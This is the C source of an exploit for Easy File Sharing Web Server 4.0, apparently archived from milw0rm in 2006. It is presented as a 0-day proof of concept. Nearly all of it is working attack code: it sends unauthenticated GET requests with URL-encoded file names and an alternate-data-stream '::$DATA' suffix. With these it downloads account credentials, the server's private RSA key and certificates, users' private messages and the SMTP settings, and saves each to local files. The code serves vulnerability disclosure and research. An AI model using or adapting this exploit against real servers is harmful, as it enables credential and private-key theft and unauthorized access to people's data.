<html><head><title>Easy File Sharing Web Server 4 Remote Information Stealer Exploit</title></head><pre>/*
===================================================================
0-day Alternative File Stream Exploit for Easy File Share Server 4
===================================================================
Exploit allows malicious users to grab files from the server without
being authenticated completely bypassing security.


0-day Easy File Sharing Web Server v4.0 Information Stealer
Discovered and Coded by Greg Linares ==&gt; GLinares.code [at] gmail [dot] com
This tool demonstrates EFS Web Server's Vulnerability to Alternative
Data Stream GET requests which allow unauthorized users to download server
critical files.

Discovered and Reported: 10-30-2006

Usage: exploit &lt;hostname/IP&gt; [port 80=default] [Method see below]

--------PoC Methods:-----
1 = Gather all login username and passwords and email addresses.[Default]
2 = Gather Private RSA Key and Certificates for server.
3 = Gather Private Messages used by Forum Users on the server
4 = Gather Server Settings File and SMTP server info.

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;		/* Win32 API */
#include &lt;wininet.h&gt;		/* WinInet API */
int mthd;
unsigned short httpport;
char exploit[512], exploit2[512], exploit3[512], exploit4[512];
char logmsg[512];
char endmsg[512];
HINTERNET inet;			/* WinInet Internet Handle */
FILE *file;

void ExploitHTTP (HINTERNET inet, const char *host, const char *exp)
{

  	HINTERNET connection;		/* Connection Handle */
    HINTERNET request;			/* Request Handle */
    unsigned long flags;		/* HttpOpenRequest Flags */

	char buffer[BUFSIZ];
    unsigned long len;


	printf(&quot;HOST: %s\n&quot;, host);
	printf(&quot;PORT: %i\n&quot;, httpport);

	if ((connection = InternetConnect(inet, host, httpport,
				      NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0))
	    == NULL)
	{
		printf(&quot;Failed to Connect...Exiting\n&quot;);
		InternetCloseHandle(inet);
		fclose(file);
		exit(1);
	}

	flags = INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_AUTO_REDIRECT |
	    INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES |
	    INTERNET_FLAG_RELOAD;

	strcat(exp, &quot;%3A%3A%24%44%41%54%41&quot;);

	request = HttpOpenRequest(connection, &quot;GET&quot;, exp, &quot;HTTP/1.0&quot;, NULL, NULL, flags, 0);
	if (request == NULL)
	{
		printf(&quot;HTTP Open Request failed....Exiting\n&quot;);
		InternetCloseHandle(connection);
		InternetCloseHandle(inet);
		fclose(file);
		exit(1);
	}
	if (!HttpSendRequest(request, NULL, 0, NULL, 0))
	{
		printf(&quot;HTTP Send Request failed....Exiting\n&quot;);
		InternetCloseHandle(request);
		InternetCloseHandle(connection);
		InternetCloseHandle(inet);
		fclose(file);
		exit(1);
	}
	printf(&quot;Exploit Sent...Dumping HTTP Return Packet...&quot;);
	sleep(1000);

	while (InternetReadFile(request, buffer, sizeof buffer, &amp;len) &amp;&amp; len &gt; 0)
	{
		fwrite(buffer, len, 1, file);
		if (fwrite(buffer, len, 1, stdout) &lt; 1)
		{
				printf(&quot;Error Outputting HTTP Return Packet\n&quot;);
		}
	}
	InternetCloseHandle(request);
    InternetCloseHandle(connection);
}


int main (int argc, char *argv[])
{

	printf(&quot;\n=========================================================================\n&quot;);
	printf(&quot;0-day Easy File Sharing Web Server v4.0 Information Stealer\n&quot;);
	printf(&quot;Discovered and Coded by Greg Linares ==&gt; GLinares.code [at] gmail [dot] com\n&quot;);
	printf(&quot;This tool demonstrates EFS Web Server's Vulnerability to Alternative\n&quot;);
	printf(&quot;Data Stream GET requests which allow unauthorized users to download server \n&quot;);
	printf(&quot;critical files.\n&quot;);
	printf(&quot;Discovered and Reported: 10-30-2006\n&quot;);
	printf(&quot;\nUsage: %s &lt;hostname/IP&gt; [port 80=default] [Method see below]\n&quot;, argv[0]);
	printf(&quot;--------PoC Methods:-----\n&quot;);
	printf(&quot;1 = Gather all login username and passwords and email addresses.[Default]\n&quot;);
	printf(&quot;2 = Gather Private RSA Key and Certificates for server.\n&quot;);
	printf(&quot;3 = Gather Private Messages used by Forum Users on the server\n&quot;);
	printf(&quot;4 = Gather Server Settings File and SMTP server info.\n&quot;);
	printf(&quot;============================================================================\n&quot;);


    inet = InternetOpen(&quot;ESF Exp&quot;, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (inet == NULL)
	{
		printf(&quot;Error accessing InternetOpen API - Exiting...\n&quot;);
		exit(1);
	}
	if (argc &lt; 2)
	{
		printf(&quot;Invalid # of arguments...Exiting\n&quot;);
		exit(1);
	}
	if (atoi(argv[3]) &gt; 4)
	{
		mthd = 1;
	}
	if (atoi(argv[3]) &lt;= 0)
	{
		mthd = 1;
	}
	mthd = atoi(argv[3]);

	/* Set Up Exploits */
	switch(mthd)
	{
    	case 1:
			file = fopen(&quot;Accounts.txt&quot;,&quot;a+&quot;);
			sprintf(exploit, &quot;%s&quot;, &quot;%75%73%65%72%2E%73%64%62&quot;);
			sprintf(endmsg, &quot;%s&quot;, &quot;\n\n\nResults Dumped to Accounts.txt\n&quot;);
			break;
		case 2:
			file = fopen(&quot;RSAKeys.txt&quot;, &quot;a+&quot;);
			sprintf(exploit, &quot;%s&quot;, &quot;%53%65%72%76%65%72%4B%65%79%2E%70%65%6D&quot;);
			sprintf(endmsg, &quot;%s&quot;, &quot;\n\n\nResults Dumped to RSAKeys.txt\n&quot;);
			break;
		case 3:
			file = fopen(&quot;Messages.txt&quot;, &quot;a+&quot;);
			sprintf(exploit, &quot;%s&quot;, &quot;%6D%73%67%31%2E%73%64%62&quot;);
			sprintf(endmsg, &quot;%s&quot;, &quot;\n\n\nResults Dumped to Messages.txt\n&quot;);
			break;
		case 4:
			file = fopen(&quot;Server.txt&quot;, &quot;a+&quot;);
			sprintf(exploit, &quot;%s&quot;, &quot;%6F%70%74%69%6F%6E%2E%69%6E%69&quot;);
			sprintf(endmsg, &quot;%s&quot;, &quot;\n\n\nResults Dumped to Server.txt\n&quot;);
			break;
	}



	sprintf(logmsg, &quot;%s&quot;, argv[1]);
	sprintf(logmsg, &quot;%s&quot;, &quot;\r\n\r\n\r\n&quot;);
	fwrite(logmsg, strlen(logmsg), 1, file);
	httpport = atoi(argv[2]);
	ExploitHTTP(inet, argv[1], exploit);
	if (mthd == 3)
	{
		printf(&quot;\n\n Sending 2nd Exploit...\n&quot;);
		strcat(exploit2, &quot;%6D%73%67%32%2E%73%64%62&quot;);
		ExploitHTTP(inet, argv[1], exploit2);
		printf(&quot;\n\n Sending 3rd Exploit...\n&quot;);
		strcat(exploit3, &quot;%6D%73%67%33%2E%73%64%62&quot;);
		ExploitHTTP(inet, argv[1], exploit3);
		printf(&quot;\n\n Sending final Exploit...\n&quot;);
		strcat(exploit4, &quot;%6D%73%67%34%2E%73%64%62&quot;);
		ExploitHTTP(inet, argv[1], exploit4);
	}
	if (mthd == 2)
	{
		printf(&quot;\n\n Sending 2nd Exploit...\n&quot;);
		strcat(exploit2, &quot;%53%65%72%76%65%72%43%65%72%74%2E%70%65%6D&quot;);
		ExploitHTTP(inet, argv[1], exploit2);
		printf(&quot;\n\n Sending final Exploit...\n&quot;);
		strcat(exploit3, &quot;%52%6F%6F%74%43%65%72%74%2E%70%65%6D&quot;);
		ExploitHTTP(inet, argv[1], exploit3);
	}
	fclose(file);

    Sleep(500);
    InternetCloseHandle(inet);
	printf(&quot;\n\n===================================================\n&quot;);
	printf(&quot;%s\n&quot;, endmsg);
	printf(&quot;Proof Of Concept Exploit by Greg Linares\n&quot;);
	printf(&quot;Send Comments/Concerns/Questions/Etc to GLinares.code [at] gmail [dot] com\n&quot;);
    return 0;

}

// milw0rm.com [2006-10-30]</pre></html>